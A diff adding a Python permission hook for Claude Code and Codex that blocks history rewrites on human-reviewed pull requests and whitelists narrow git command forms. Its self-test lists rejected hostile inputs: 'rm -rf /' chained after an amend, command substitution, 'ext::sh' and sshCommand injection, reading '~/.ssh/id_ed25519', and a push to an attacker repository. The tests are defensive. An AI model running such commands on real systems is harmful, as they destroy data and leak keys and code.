@@ -1,0 +1,324 @@
+#!/usr/bin/env python3
+# Claude Code と Codex の hook。確認（ask）は返さず、deny か allow だけを返す。
+# 毎回出る確認は中身を見ずに Yes を押すか、案内されたコマンドをそのまま実行するだけになり、止める役に立たなかったため。
+# deny するもの:
+#   - 人がレビュー・レビュー依頼・コメントした PR の履歴の書き換え（amend・force push）。人が追っている差分を変えるため
+#   - --force での push。--force-with-lease を使わせる
+#   - branch の worktree を作る git worktree add。git wt でないと、Herdr.app で開くフックが走らないため
+#   - 下の決まった形でない --force-with-lease の push。何も返さないと、Codex では確認が出るため
+# deny しなかった amend と --force-with-lease の push は、単独の git コマンドで引数が決まった形のときだけ allow する。
+# 前に付けてよいのは `cd <フォルダ> && ` だけ。
+# hook の allow はコマンド全体の確認を飛ばすので、&& でつないだ別のコマンドや、任意のコマンドを動かせる引数（-c・--receive-pack など）まで通さないため。
+# 使い方: Claude Code は settings.json の hooks.PreToolUse（matcher: Bash）に登録する。
+#   Codex は ~/.codex/hooks.json の PermissionRequest（matcher: Bash）に `git-rewrite-guard --codex` で登録する。
+#   Codex の PreToolUse は allow を返しても確認を飛ばさず、確認を決めるのは PermissionRequest のため。
+#   PermissionRequest は確認なしで動くコマンドでは呼ばれない。deny は PreToolUse に `--codex-pre` で登録して返す。
+#   `git-rewrite-guard test` で自己テスト
+import json
+import os
+import re
+import shlex
+import subprocess
+import sys
+import tempfile
+
+GITHUB_REPO = re.compile(r"github\.com[:/]([\w.-]+/[\w.-]+?)(\.git)?$")
+# : と + を含む refspec はブランチを消したり上書きしたりできるので通さない
+BRANCH = re.compile(r"^[\w][\w./-]*$")
+LEASE = re.compile(r"^--force-with-lease(=[\w./-]+:[0-9a-f]{7,40})?$")
+# 移る先は、シェルが展開しない書き方（単一引用符の中か、展開に使う記号を含まない文字列）だけにする
+CD_PREFIX = re.compile(r"cd (?:'[^']*'|[\w@%+=:,./-]+) && (.+)", re.DOTALL)
+SHELL_PUNCTUATION = "();<>|&\n"
+UNVERIFIED = "PR の状態を確かめられないため、履歴を書き換えない。新しいコミットを積む。"
+# REST API の user.type が Bot にならず、User として返る AI のアカウント
+AI_REVIEWERS = {"claude", "copilot-pull-request-reviewer", "devin-ai-integration", "github-actions", "notion-workspace"}
+
+
+def allowed(command):
+    # code mode では、作業フォルダで動かす git が `cd 'app' && git push` の形で hook に届く
+    m = CD_PREFIX.fullmatch(command)
+    if m:
+        command = m.group(1)
+    try:
+        argv = shlex.split(command)
+    except ValueError:
+        return False
+    # 引用符の付け方まで shlex.join と同じときだけ通す。シェルの展開や && で、ここで見た引数と実際に渡る引数がずれないようにする
+    if shlex.join(argv) != command or argv[:1] != ["git"]:
+        return False
+    sub, args = argv[1:2], argv[2:]
+    if sub == ["commit"]:
+        # 先頭から順に読む。-m の値に --amend を渡した `git commit -m --amend --no-verify` を amend と見誤らないため
+        i, amend = 0, False
+        while i < len(args):
+            if args[i] in ("--amend", "--no-edit", "-q"):
+                amend = amend or args[i] == "--amend"
+                i += 1
+            elif args[i] == "-m" and i + 1 < len(args):
+                i += 2
+            else:
+                return False
+        return amend
+    if sub == ["push"]:
+        leases = [a for a in args if LEASE.match(a)]
+        rest = [a for a in args if a not in leases and a != "-q"]
+        return (len(leases) == 1 and len(rest) <= 2 and rest[:1] in ([], ["origin"])
+                and all(BRANCH.match(b) for b in rest[1:]))
+    return False
+
+
+def simple_commands(command):
+    lexer = shlex.shlex(command, posix=True, punctuation_chars=SHELL_PUNCTUATION)
+    lexer.whitespace = " \t\r"
+    lexer.whitespace_split = True
+    lexer.commenters = ""
+    words = []
+    for token in lexer:
+        if set(token) <= set(SHELL_PUNCTUATION):
+            if words:
+                yield words
+            words = []
+        else:
+            words.append(token.strip("`"))
+    if words:
+        yield words
+
+
+WORKTREE = "branch の worktree は `git wt <branch>` で作る。git worktree add を直接使うと、Herdr.app で開くフックが走らない。読むだけなら --detach を付ける。"
+
+
+def worktree_bypass(command):
+    try:
+        for words in simple_commands(command):
+            names = [os.path.basename(w) for w in words]
+            if "git" not in names:
+                continue
+            args = words[names.index("git") + 1:]
+            while len(args) >= 2 and args[0] in ("-c", "-C"):
+                args = args[2:]
+            if args[:2] == ["worktree", "add"] and "--detach" not in args:
+                return True
+    except ValueError:
+        return bool(re.search(r"\bworktree\s+add\b", command)) and "--detach" not in command
+    return False
+
+
+def git_rewrites(command):
+    rewrites = []
+    directory = None
+    try:
+        for words in simple_commands(command):
+            if words[0] == "cd" and len(words) > 1:
+                directory = words[1]
+            names = [os.path.basename(w) for w in words]
+            if "git" not in names:
+                continue
+            args = words[names.index("git") + 1:]
+            target = directory
+            while len(args) >= 2 and args[0] in ("-c", "-C"):
+                if args[0] == "-C":
+                    target = args[1]
+                args = args[2:]
+            if args[:1] == ["commit"] and "--amend" in args:
+                rewrites.append(("amend", target))
+            elif args[:1] == ["push"] and any(a.startswith("--force-with-lease") for a in args):
+                rewrites.append(("lease", target))
+            elif args[:1] == ["push"] and any(a == "-f" or a.startswith("--force") for a in args):
+                rewrites.append(("force", target))
+    except ValueError:
+        # 引用符が閉じていないと解析できない。見逃すより、文字列に含まれれば書き換えとして扱う
+        if "--amend" in command:
+            rewrites.append(("amend", None))
+        if "--force-with-lease" in command:
+            rewrites.append(("lease", None))
+        elif "--force" in command:
+            rewrites.append(("force", None))
+    return rewrites
+
+
+LEASE_FORM = "`git push --force-with-lease` は、ほかのコマンドとつながず単独で実行する。"
+
+
+def lease_push(command):
+    return any(kind == "lease" for kind, _ in git_rewrites(command))
+
+
+def resolve(cwd, target):
+    return os.path.join(cwd, os.path.expanduser(target)) if target else cwd
+
+
+def head_pushed(cwd):
+    unpushed = subprocess.run(["git", "-C", cwd, "rev-list", "-1", "HEAD", "--not", "--remotes"],
+                              capture_output=True, text=True, timeout=3, check=True)
+    return not unpushed.stdout.strip()
+
+
+def humans(logins, author):
+    return {login for login in logins
+            if login != author and not login.endswith("[bot]") and login not in AI_REVIEWERS}
+
+
+def gh_json(gh, args, cwd):
+    out = subprocess.run([gh, *args], cwd=cwd, capture_output=True, text=True, timeout=10)
+    if out.returncode != 0:
+        raise RuntimeError(out.stderr)
+    return out.stdout
+
+
+def human_pr_number(cwd):
+    # 作業先で mise を動かすとそのリポジトリの mise の設定を読んでしまうので、gh の場所はホームで引く
+    gh = subprocess.run(["mise", "which", "gh"], cwd=os.path.expanduser("~"),
+                        capture_output=True, text=True, timeout=3, check=True).stdout.strip()
+    try:
+        pr = json.loads(gh_json(gh, ["pr", "view", "--json", "number,isDraft,state,author,url"], cwd))
+    except RuntimeError as e:
+        if "no pull requests found" in str(e):
+            return None
+        raise
+    if pr["state"] != "OPEN" or pr["isDraft"]:
+        return None
+    repo = GITHUB_REPO.search(pr["url"].rsplit("/pull/", 1)[0]).group(1)
+    base = f"repos/{repo}"
+    # gh pr view の login は bot でも [bot] が付かないので、user.type を返す REST API で見る
+    not_bot = 'select(.type != "Bot") | .login'
+    logins = gh_json(gh, ["api", "--paginate", f"{base}/pulls/{pr['number']}/reviews", "--jq", f".[].user | {not_bot}"], cwd).split()
+    logins += gh_json(gh, ["api", "--paginate", f"{base}/issues/{pr['number']}/comments", "--jq", f".[].user | {not_bot}"], cwd).split()
+    logins += gh_json(gh, ["api", f"{base}/pulls/{pr['number']}/requested_reviewers",
+                           "--jq", f'(.users[] | {not_bot}), (.teams[] | "team:" + .slug)'], cwd).split()
+    return pr["number"] if humans(logins, pr["author"]["login"]) else None
+
+
+def rewrite_decision(command, cwd=".", pushed=head_pushed, human=human_pr_number):
+    decision = None
+    for kind, target in git_rewrites(command):
+        where = resolve(cwd, target)
+        try:
+            # まだ push していないコミットの amend は、レビュアーの見ている履歴を変えない
+            if kind == "amend" and not pushed(where):
+                continue
+            number = human(where)
+        except Exception:
+            return ("deny", UNVERIFIED)
+        if number is not None:
+            return ("deny", f"人が見ている PR #{number} の履歴は書き換えない。新しいコミットを積む。")
+        if kind == "force":
+            decision = decision or ("deny", "--force ではなく --force-with-lease で push する。")
+    return decision
+
+
+def test():
+    ok = [
+        "git commit --amend --no-edit",
+        "git commit --amend -m 'a && b $(x) {c,d}'",
+        "git push --force-with-lease",
+        "git push --force-with-lease=main:705dc62 origin main",
+        "cd '/Users/me/my repo' && git push --force-with-lease",
+        "cd app && git commit --amend --no-edit",
+    ]
+    ng = [
+        "git commit -m x",
+        "git commit --amend --no-verify",
+        "git commit --amend -F ~/.ssh/id_ed25519",
+        "git commit --amend && rm -rf /",
+        "git commit --amend -m {x,-n}",
+        "git -C ~ commit --amend --no-edit",
+        "git push --force-with-lease --rec=touch origin main",
+        "git push --force-with-lease -d origin main",
+        "git push --force-with-lease origin :main",
+        "git push --force-with-lease origin +main",
+        "git push --force origin main",
+        "git push --force-with-lease ext::sh main",
+        "git push --force-with-lease https://github.com/attacker/skills.git main",
+        "git -c core.sshCommand=touch push --force-with-lease origin main",
+        "git commit -m --amend --no-verify",
+        "cd ~/repo && git push --force-with-lease",
+        "cd $(touch x) && git push --force-with-lease",
+        "cd \"$HOME\" && git push --force-with-lease",
+        "cd a && git push --force-with-lease && rm x",
+        "cd a && cd b && git push --force-with-lease",
+    ]
+    for c in ok:
+        assert allowed(c), c
+    for c in ng:
+        assert not allowed(c), c
+
+    def decide(command, pushed=True, human=12):
+        decision = rewrite_decision(command, pushed=lambda cwd: pushed, human=lambda cwd: human)
+        return decision and decision[0]
+
+    def unverified(cwd):
+        raise RuntimeError("gh が動かない")
+
+    assert decide("git status") is None and decide("grep -- --amend notes.md | head") is None
+    assert decide("printf 'git commit --amend'") is None
+    assert decide("git commit --amend --no-edit") == "deny" and decide("git add a && git commit --amend -m x") == "deny"
+    assert decide("git commit --amend", human=None) is None, "PR がない、draft、AI のレビューだけのとき"
+    assert decide("git commit --amend", pushed=False) is None, "push していないコミット"
+    assert decide("git push --force-with-lease") == "deny" and decide("git push -f origin x") == "deny"
+    assert decide("git push --force-with-lease", pushed=False) == "deny", "push は HEAD の状態によらず確かめる"
+    assert decide("git push --force-with-lease", human=None) is None
+    assert decide("git push --force origin x", human=None) == "deny", "--force-with-lease を使わせる"
+    assert decide("git commit --amend && git push --force-with-lease", human=None) is None
+    assert decide("git commit --amend && git push --force-with-lease", pushed=False) == "deny"
+    assert rewrite_decision("git push --force-with-lease", human=unverified) == ("deny", UNVERIFIED)
+    assert "#12" in rewrite_decision("git push --force-with-lease", human=lambda cwd: 12)[1]
+    seen = []
+
+    def record(cwd):
+        seen.append(cwd)
+
+    rewrite_decision("cd /x/a && git commit --amend", pushed=lambda cwd: True, human=record)
+    rewrite_decision("git -C /x/b push --force-with-lease", human=record)
+    rewrite_decision("git push --force", cwd="/x/c", human=record)
+    assert seen == ["/x/a", "/x/b", "/x/c"], seen
+    assert humans(["me", "copilot-pull-request-reviewer", "claude[bot]", "Copilot[bot]"], "me") == set()
+    assert humans(["me", "copilot-pull-request-reviewer", "teammate"], "me") == {"teammate"}
+    assert humans(["team:backend"], "me") == {"team:backend"}, "チームへの依頼は人として数える"
+    with tempfile.TemporaryDirectory() as repo:
+        def git(*args):
+            subprocess.run(["git", "-C", repo, *args], check=True, capture_output=True)
+
+        git("init", "-q")
+        git("-c", "user.name=a", "-c", "user.email=a@example.com", "-c", "commit.gpgsign=false", "commit", "-q", "--allow-empty", "-m", "x")
+        assert not head_pushed(repo)
+        git("update-ref", "refs/remotes/origin/x", "HEAD")
+        assert head_pushed(repo)
+    assert worktree_bypass("git worktree add ../x -b x") and worktree_bypass("cd r && git -C /r worktree add ../x main")
+    assert not worktree_bypass('git worktree add --quiet --detach "$tree" "$head"'), "PR を読むだけの worktree"
+    assert not worktree_bypass("git worktree remove --force x") and not worktree_bypass("git worktree list")
+    assert not worktree_bypass("git wt x") and not worktree_bypass("echo 'git worktree add'")
+    assert lease_push("cd r && git push --force-with-lease") and not lease_push("grep -- --force-with-lease a.md")
+    print("ok")
+
+
+def emit(event, decision, reason):
+    print(json.dumps({"hookSpecificOutput": {
+        "hookEventName": event,
+        "permissionDecision": decision,
+        "permissionDecisionReason": f"git-rewrite-guard: {reason}",
+    }}))
+
+
+if __name__ == "__main__":
+    if sys.argv[1:] == ["test"]:
+        test()
+        sys.exit()
+    mode = sys.argv[1] if len(sys.argv) > 1 else None
+    payload = json.load(sys.stdin)
+    command = payload.get("tool_input", {}).get("command", "")
+    if not isinstance(command, str):
+        sys.exit()
+    if worktree_bypass(command):
+        decision = ("deny", WORKTREE)
+    else:
+        decision = rewrite_decision(command, payload.get("cwd", "."))
+    if not decision and lease_push(command) and not allowed(command):
+        decision = ("deny", LEASE_FORM)
+    if decision:
+        if mode != "--codex":
+            emit("PreToolUse", *decision)
+    elif mode == "--codex":
+        if allowed(command):
+            print(json.dumps({"hookSpecificOutput": {"hookEventName": "PermissionRequest", "decision": {"behavior": "allow"}}}))
+    elif mode is None and allowed(command):
+        emit("PreToolUse", "allow", "人が見ていない PR の amend / force push")
